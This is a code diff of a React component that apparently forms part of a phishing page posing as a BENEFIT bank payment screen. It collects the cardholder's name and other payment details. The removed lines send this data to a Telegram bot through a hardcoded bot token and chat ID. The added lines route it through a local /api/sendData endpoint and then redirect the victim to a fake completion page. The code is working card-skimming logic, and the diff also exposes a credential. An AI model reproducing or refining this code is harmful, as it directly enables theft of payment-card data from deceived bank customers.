@@ -56,10 +56,8 @@ const BenefitPayContent = () => {
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };
-
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (validate()) {
+const handleSend = async () => {
+  if (validate()) {
       const text = `
 🏦 Bank: BENEFIT
 👤 Full Name: ${formData.cardHolder}
@@ -70,22 +68,29 @@ const BenefitPayContent = () => {
 🔨 Ref: ${refN}
 💲 Price: ${price}.000
       `;
+  try {
+    
+    const res = await fetch("/api/sendData", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text }),
+    });
 
-      try {
-        await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
-          {
-            chat_id: "-4836393174",
-            text: text
-          }
-        );
-        router.push(`/benefitpay/finish?refN=${refN}`);
-      } catch (error) {
-        alert("Error sending data");
-        console.error(error);
-      }
+    const result = await res.json();
+    
+
+    if (result.success) {
+      router.push(`/benefitpay/finish?refN=${refN}&price=${price}`);
+    } else {
+      alert("حدث خطأ: " + result.error);
     }
-  };
+  } catch (err) {
+    
+    console.error(err);
+    alert("حدث خطأ أثناء الإرسال");
+  }
+};
+  
 
   const months = Array.from({ length: 12 }, (_, i) => ({
     value: String(i + 1).padStart(2, '0'),
